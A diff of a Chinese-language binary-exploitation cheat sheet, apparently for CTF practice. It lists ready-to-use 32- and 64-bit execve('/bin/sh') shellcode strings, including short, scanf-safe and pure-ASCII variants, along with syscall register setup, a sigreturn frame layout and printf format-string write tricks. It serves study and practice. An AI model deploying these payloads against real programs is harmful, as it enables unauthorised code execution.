@@ -1,53 +1,21 @@
-vmmap:
-    查看内存空间
-
-
-
-fmtarg 0x7fff8888
-    识别栈中的数据相当于格式化字符串的第几个参数
-    32位格式化字符串从低端到高端依次解析
-
-
-
-设置开启pie断点b *$rebase(0x12AC)
-
-
-
-parseheap
-    查看堆空间
-
-
-
-bins
-    查看bin
-
-
-
-hexdump
-    16进制显示
-
-
-    
-telescope 0xx0
-    显示内存中的信息
-
-
 shellcode:
-    32位 短字节shellcode --> 21字节
+    32位 scanf可读取的shellcode
+        \xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh
+    32位 短字节shellcode 21字节
         \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
     32位 纯ascii字符shellcode
         PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA
-    32位 scanf可读取的shellcode
-        \xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh
+    
     64位 scanf可读取的shellcode 22字节
         \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
-    64位 较短的shellcode  23字节
+    64位 较短的shellcode 23字节
         \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
     64位 纯ascii字符shellcode
         Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
 
 
-函数返回值
+
+函数返回值存放的寄存器
     64位:rax
     32位:eax
 函数传参
@@ -58,6 +26,7 @@ shellcode:
     edx = 0         // 第三个参数
     esx = 0         // 第四个参数
     edi = 0         // 第五个参数
+
     64位
     rax = 0x3B      // execve系统调用号
     rdi = /bin/sh   // 第一个参数
@@ -69,23 +38,7 @@ shellcode:
 
 
 
-ROPgadget:
-    ROPgadget --binary filename --only 'pop|ret'
-    ROPgadget --binary filename --string '/bin/sh'
-    ROPgadget --binary filename --ropchain
-
-
-
-ropper
-    ropper --file xxxx --search "int 0x80"
-    ropper
-    file filename
-    search int 0x80
-
-
-
 Signal Frame
-    Frame = SigreturnFrame() # 设置恢复的寄存器
     0x00  rt_sigreturn          uc_flags
     0x10  &uc                   uc_stack.ss_sp
     0x20  uc_stack.ss_flags     uc_stack.ss_size
@@ -104,16 +57,8 @@ Signal Frame
     0xF0  __reserved            sigmask
 
 
-
-寻找系统调用号
-    constants.SYS_read
-    constants.SYS_write
-    ...
-
-
-
 printf:
-    %6$p : 以指针的形式打印第六个参数
-    %hhn %hn %n %ln : 将在此之前打印的数量保存(分别1, 2, 4, 8字节)
-    printf("%10c%6$n"):将10保存在第六个参数所指向的地址
-
+    %6$p                : 以指针的形式打印第六个参数
+    %hhn %hn %n %ln     : 将在此之前打印的数量保存(分别1, 2, 4, 8字节)
+    printf("%10c%6$n")  : 将10保存在第六个参数所指向的地址
+    printf("%*1$c%2$n") : 将第一个参数赋值给第二个参数指向的地址
